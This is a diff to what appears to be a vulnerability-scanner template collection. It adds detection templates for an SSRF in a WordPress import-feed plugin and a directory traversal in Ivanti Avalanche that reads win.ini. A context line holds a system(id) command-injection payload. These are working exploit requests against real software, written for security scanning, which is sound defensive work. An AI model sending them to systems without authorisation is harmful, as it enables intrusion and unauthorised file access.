@@ -9892,6 +9892,35 @@
       ]
     },
     {
+      "id": "CVE-2020-24148",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Server-side request forgery (SSRF) in the Import XML and RSS Feeds (import-xml-feed)\nplugin 2.0.1 for WordPress via the data parameter in a moove_read_xml action.\n",
+        "name": "Import XML & RSS Feeds Wordpress Plugin <= 2.0.1 SSRF",
+        "reference": "https://github.com/dwisiswant0/CVE-2020-24148",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin,ssrf"
+      },
+      "requests": [
+        {
+          "body": "type=url&data=http%3A%2F%2F{{interactsh-url}}%2F&xmlaction=preview&node=0",
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=moove_read_xml"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-24186",
       "info": {
         "author": "Ganofins",
@@ -14702,6 +14731,40 @@
           "matchers-condition": "and",
           "raw": [
             "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\n\nSPOOLDIR=test\".system(id).\"&recheck=Recheck\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-30497",
+      "info": {
+        "author": "gy741",
+        "name": "Ivanti Avalanche Directory Traversal",
+        "reference": "https://ssd-disclosure.com/ssd-advisory-ivanti-avalanche-directory-traversal/",
+        "severity": "high",
+        "tags": "cve,cve2021,avalanche,traversal"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "for 16-bit app support"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini"
           ]
         }
       ]
